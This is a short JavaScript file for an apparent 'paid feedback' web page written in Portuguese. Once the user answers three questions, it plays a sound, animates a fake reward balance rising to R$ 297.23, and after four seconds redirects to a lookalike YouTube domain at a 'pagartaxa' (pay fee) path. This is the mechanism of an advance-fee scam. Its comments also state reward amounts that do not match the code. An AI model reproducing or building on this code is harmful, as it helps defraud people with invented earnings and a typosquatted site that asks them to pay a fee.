document.addEventListener('DOMContentLoaded', function() {
    const successAudio = document.getElementById('success-audio');  // ID corrigido
    const form = document.getElementById('feedback-form');
    const submitBtn = document.getElementById('submit-btn');
    const cardRedText = document.getElementById('cardRedText');
    const popup = document.getElementById('popup');
    const ganhoValue = document.getElementById('ganho-value');

    function updateButtonState() {
        const checkedCount = Array.from(form.querySelectorAll('input[type="radio"]:checked')).length;
        submitBtn.disabled = checkedCount < 3;
    }

    form.addEventListener('change', updateButtonState);

    submitBtn.addEventListener('click', (e) => {
        e.preventDefault();  // Evita o envio do formulário

        // Verifica se o áudio foi encontrado
        if (successAudio) {
            successAudio.play().then(() => {
                console.log('Áudio reproduzido com sucesso!');
            }).catch(error => {
                console.error('Erro ao tentar reproduzir o áudio:', error);
            });
        } else {
            console.error('Elemento de áudio não encontrado.');
        }

        // Transição de valores de R$ 33,00 para R$ 85,50
let valor = 22230; // Valor inicial em centavos (R$ 33,00)
const valorFinal = 29723; // Valor final em centavos (R$ 85,50)
const incremento = (valorFinal - valor) / 100; // Incremento para a transição
const intervalo = setInterval(() => {
    valor += incremento;
    if (valor >= valorFinal) {
        valor = valorFinal;
        clearInterval(intervalo);
    }
    cardRedText.textContent = `R$ ${(valor / 100).toFixed(2)}`;
}, 10);

        // Exibe o popup
        popup.style.display = 'block';
        
        // Oculta o popup após 4 segundos
        setTimeout(function() {
            popup.classList.add("hidden");
            window.location.href = "https://youtbepremiado.online/pagartaxa/";
        }, 4000);
    });
});
